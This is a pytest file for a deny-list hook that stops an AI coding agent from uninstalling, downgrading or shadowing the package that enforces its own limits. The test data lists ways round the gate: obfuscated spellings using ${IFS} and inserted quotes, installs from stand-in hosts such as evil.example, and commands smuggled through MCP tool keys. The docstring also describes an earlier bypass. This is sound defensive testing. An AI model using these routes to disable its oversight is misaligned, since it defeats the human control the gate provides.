"""Package-manager self-protection in the deny-list (0.5.11).

The gap this closes, exactly: `pip uninstall recusal` DEFERRED through the deny-list.
`_SELF_PROTECT_VERB` matched `\\binstall\\b`, which never matches "uninstall" (there is
no word boundary inside the word), and `targets_protected` required a `recusal/` path
segment that a bare package name never carries. The same hole covered install-time
replacement: `pip install -e ./fake-recusal` shadowing the real package.

These tests pin the fix: any pip / `python -m pip` / `py -m pip` / `uv pip` install or
uninstall (and `uv add` / `uv remove`) that names a protected package is refused as a
control-plane change, obfuscated spellings included, through the Bash tool AND through a
non-Bash tool carrying a command-like key. The negative space is pinned just as hard:
mutating OTHER packages, and read-only pip subcommands against recusal, still defer
(false positives are how gates get uninstalled by humans).

0.5.12 widens the matcher to the valid, statically visible command forms the 0.5.11
regex missed: a global option carrying a separate value (`pip --python .venv
uninstall`, `uv --project . remove`), uv global options before the subcommand, and
Windows launcher suffixes (`pip.exe`). It also makes two contracts explicit and
tested: protected names are canonical distribution identities (PEP 503, so `My.Gate`
protects `my_gate`/`MY.GATE`; an empty name is a `ValueError` at construction), and
name matching is deliberately substring-over-refusing (`notrecusal`, `./fake-recusal`,
`recusal-replacement.tar.gz` refuse toward safety).
"""

import pytest

from recusal import Decision, Severity, compute_verdict
from recusal.claude_code import decide
from recusal.deny_list import (
    DEFAULT_PROTECTED_PACKAGES,
    analyze_command,
    deny_list_policy,
)


def _decision(policy, tool, tool_input):
    return decide(tool, tool_input, policy)[0]


def _refuses(cmd: str, **kwargs) -> bool:
    findings = analyze_command(cmd, **kwargs)
    return any(f.check == "package_self_protection" for f in findings)


# --- the exact reported gap ---------------------------------------------------------------


def test_pip_uninstall_recusal_is_refused_the_reported_gap():
    findings = analyze_command("pip uninstall recusal")
    assert any(f.check == "package_self_protection" for f in findings)
    assert compute_verdict(findings).decision is Decision.FAIL


def test_pip_uninstall_recusal_denied_end_to_end_through_the_hook_policy():
    policy = deny_list_policy()
    assert _decision(policy, "Bash", {"command": "pip uninstall recusal"}) == "deny"


def test_editable_shadow_install_is_refused():
    assert _refuses("pip install -e ./fake-recusal")


# --- spellings: every documented interpreter/launcher route to pip ------------------------


@pytest.mark.parametrize(
    "cmd",
    [
        "pip uninstall recusal",
        "pip uninstall -y recusal",
        "pip3 uninstall recusal",
        "pip3.12 uninstall recusal",
        "python -m pip uninstall recusal",
        "python3 -m pip uninstall -y recusal",
        "python3.12 -m pip uninstall recusal",
        "py -m pip uninstall recusal",
        "py -3.12 -m pip uninstall recusal",
        "pypy3 -m pip uninstall recusal",
        "uv pip uninstall recusal",
        "uv remove recusal",
    ],
)
def test_uninstall_spellings_refuse(cmd):
    assert _refuses(cmd)


@pytest.mark.parametrize(
    "cmd",
    [
        "pip install recusal",
        "pip install -U recusal",
        "pip install --upgrade recusal",
        "pip install --force-reinstall recusal==0.1.0",
        "pip install recusal==0.5.10",
        "pip -q install recusal",
        "pip --no-cache-dir install recusal",
        "pip install -e ./fake-recusal",
        "pip install -e /tmp/recusal",
        "pip install ./vendored-recusal",
        "pip install git+https://github.com/evil/recusal.git",
        "pip install https://evil.example/recusal-9.9.9.tar.gz",
        "pip install --target site-packages recusal",
        "python -m pip install -e ./fake-recusal",
        "py -m pip install recusal==0.0.1",
        "uv pip install recusal",
        "uv add recusal",
    ],
)
def test_install_and_shadow_spellings_refuse(cmd):
    # Reinstalling, downgrading, or shadowing the enforcement package is the same
    # control-plane change as uninstalling it: the gate's code is what changes.
    assert _refuses(cmd)


def test_uppercase_and_spacing_are_normalized():
    assert _refuses("PIP   Uninstall   RECUSAL")


# --- obfuscated spellings go through the same de-obfuscation as every other check ---------


@pytest.mark.parametrize(
    "cmd",
    [
        "pip unin''stall recusal",
        'pip uninstall "recusal"',
        "pip${IFS}uninstall${IFS}recusal",
        "pip\tuninstall\trecusal",
        "pip unin\\stall recusal",
        "uv${IFS}remove${IFS}recusal",
    ],
)
def test_obfuscated_package_mutation_refuses(cmd):
    assert _refuses(cmd)


# --- 0.5.12: option/value forms, uv global options, launcher suffixes ----------------------


@pytest.mark.parametrize(
    "cmd",
    [
        # pip global options that carry a separate value token (documented `--python`
        # form): the 0.5.11 regex allowed dash tokens between pip and the subcommand
        # but never an option's bare value, so `.venv` broke the match.
        "python -m pip --python .venv install recusal",
        "pip --python .venv uninstall recusal",
        "pip --python=.venv uninstall recusal",
        "uv pip --python .venv uninstall recusal",
        # uv documents `uv [OPTIONS] <COMMAND>`: global options (with and without
        # values) are valid before `add`/`remove`/`pip`.
        "uv --project . remove recusal",
        "uv --directory . remove recusal",
        "uv --offline remove recusal",
        # Direct Windows launcher spellings.
        "pip.exe uninstall recusal",
        "python.exe -m pip uninstall recusal",
        # Composed: launcher suffix + version selector + option/value.
        "py -3.12 -m pip --python .venv uninstall recusal",
    ],
)
def test_option_value_and_launcher_forms_refuse(cmd):
    assert _refuses(cmd)


def test_obfuscated_option_value_form_refuses():
    # The walker runs over the same de-obfuscated variants as every other check.
    assert _refuses("pip${IFS}--python${IFS}.venv${IFS}uninstall${IFS}recusal")


@pytest.mark.parametrize(
    "cmd",
    [
        # The widened matcher must not widen the false-positive space: the same
        # option/value and launcher forms against OTHER packages still defer.
        "pip --python .venv install requests",
        "uv --project . add httpx",
        "pip.exe install requests",
        # Out of the documented pip+uv surface by design: pipx and `uv tool` manage
        # isolated tool environments, not the import path the gate's venv resolves.
        "uv tool install some-tool",
        "uv tool uninstall some-tool",
    ],
)
def test_widened_forms_keep_deferring_on_other_packages(cmd):
    assert analyze_command(cmd) == []


# --- 0.5.12: protected names are canonical distribution identities (PEP 503) ---------------


@pytest.mark.parametrize(
    "cmd",
    [
        "pip uninstall my-gate",
        "pip uninstall my_gate",
        "pip uninstall my.gate",
        "pip uninstall MY.GATE",
        "pip install ./fake-my.gate",
    ],
)
def test_custom_name_matches_across_separator_and_case_spellings(cmd):
    # Python distribution names are case-insensitive with `-`/`_`/`.` runs collapsed;
    # a configured `My.Gate` must protect every spelling of that one identity. (In
    # 0.5.11 a mixed-case configured name silently matched nothing at all: the
    # pattern kept its case while commands are matched lowercased.)
    assert _refuses(cmd, protected_packages=("My.Gate",))


def test_canonically_different_name_still_defers():
    assert not _refuses("pip uninstall mygate", protected_packages=("My.Gate",))


@pytest.mark.parametrize("pkgs", [("",), ("   ",), ("recusal", ""), ("...",), ("-_-",)])
def test_empty_or_separator_only_protected_name_is_a_config_error(pkgs):
    # An empty canonical name would match EVERY package mutation: that is a
    # configuration error, refused loudly at construction, not a silent deny-all.
    with pytest.raises(ValueError):
        deny_list_policy(protected_packages=pkgs)
    with pytest.raises(ValueError):
        analyze_command("ls", protected_packages=pkgs)


# --- 0.5.12: substring matching is a deliberate contract (over-refuse toward safety) -------


@pytest.mark.parametrize(
    "cmd",
    [
        "pip install notrecusal",
        "pip install recusal-helper",
        "pip uninstall unrelated-recusal-docs",
        "pip install https://example.test/recusal-replacement.tar.gz",
    ],
)
def test_name_containing_sources_over_refuse_by_contract(cmd):
    # Chosen contract: any mutating package command whose argument CONTAINS a
    # protected name is refused toward safety. A name-containing source is a
    # plausible shadow or replacement of the gate; the cost is a safe-side false
    # positive that defers to a human, the alternative is a false negative that
    # uninstalls the gate.
    assert _refuses(cmd)


# --- the second shell: a non-Bash tool carrying a command-like key ------------------------


def test_mcp_shell_command_key_cannot_smuggle_the_uninstall():
    policy = deny_list_policy()
    assert (
        _decision(
            policy,
            "mcp__runner__execute",
            {"args": {"Command": "pip uninstall recusal"}},
        )
        == "deny"
    )


def test_argv_vector_form_is_joined_and_refused():
    policy = deny_list_policy()
    assert (
        _decision(
            policy,
            "mcp__runner__execute",
            {"command": ["pip", "uninstall", "-y", "recusal"]},
        )
        == "deny"
    )


def test_option_value_form_is_refused_through_a_command_key_too():
    # The widened matcher applies wherever command analysis applies: a non-Bash tool
    # carrying the option/value form under a command-like key is refused the same way.
    policy = deny_list_policy()
    assert (
        _decision(
            policy,
            "mcp__runner__execute",
            {"args": {"Command": "pip --python .venv uninstall recusal"}},
        )
        == "deny"
    )


# --- negative space: no new false positives -----------------------------------------------


@pytest.mark.parametrize(
    "cmd",
    [
        "pip install requests",
        "pip uninstall requests",
        "pip install -U pytest ruff mypy",
        "python -m pip install --upgrade pip",
        "uv add httpx",
        "uv remove httpx",
        "uv pip install numpy",
        "pip install -e .",
        "pip install -r requirements.txt",
        "pip show recusal",
        "pip download recusal",
        "pip index versions recusal",
        "pip list",
        "pip freeze",
        "pip freeze | grep recusal",
        "pipx install some-tool",
        "python -m pip check",
    ],
)
def test_benign_package_commands_defer(cmd):
    assert analyze_command(cmd) == []


def test_named_ceiling_unnamed_editable_install_defers():
    # `pip install -e .` inside a checkout that PROVIDES recusal is unreadable to a
    # string matcher: the package name appears nowhere in the command. This is the
    # documented deny-list ceiling; the pinned, write-protected venv is the defense.
    assert analyze_command("pip install -e .") == []


# --- parameterization ----------------------------------------------------------------------


def test_default_protected_packages_is_recusal():
    assert DEFAULT_PROTECTED_PACKAGES == ("recusal",)


def test_custom_protected_package_refuses_and_default_name_releases():
    assert _refuses("pip uninstall mygate", protected_packages=("mygate",))
    # With a custom set, mutating packages OUTSIDE it defers, including recusal itself.
    assert not _refuses("pip uninstall recusal", protected_packages=("mygate",))


def test_empty_protected_packages_disables_the_guard():
    assert not _refuses("pip uninstall recusal", protected_packages=())


def test_policy_level_custom_protected_packages():
    policy = deny_list_policy(protected_packages=("mygate",))
    assert _decision(policy, "Bash", {"command": "pip uninstall mygate"}) == "deny"
    assert _decision(policy, "Bash", {"command": "pip uninstall somethingelse"}) == "defer"


def test_package_name_is_regex_escaped():
    # A package name containing regex metacharacters must be matched literally,
    # never compiled as a pattern.
    assert _refuses("pip uninstall my.gate", protected_packages=("my.gate",))
    assert not _refuses("pip uninstall myxgate", protected_packages=("my.gate",))


# --- the verb-level fix: `uninstall` now counts as a write verb on protected paths ---------


def test_uninstall_verb_with_protected_path_is_self_protection():
    # `uninstall` never matched `\binstall\b` (no word boundary inside a word), so an
    # uninstall-verbed command aimed at a protected path slipped the verb check entirely.
    findings = analyze_command("npm uninstall --prefix .claude/hooks recusal-gate")
    assert any(f.check == "self_protection" for f in findings)


# --- finding shape --------------------------------------------------------------------------


def test_finding_names_the_package_and_carries_the_command():
    findings = analyze_command("pip uninstall recusal")
    f = next(f for f in findings if f.check == "package_self_protection")
    assert f.severity is Severity.CRITICAL
    assert "recusal" in f.message
    assert "outside the governed session" in f.message
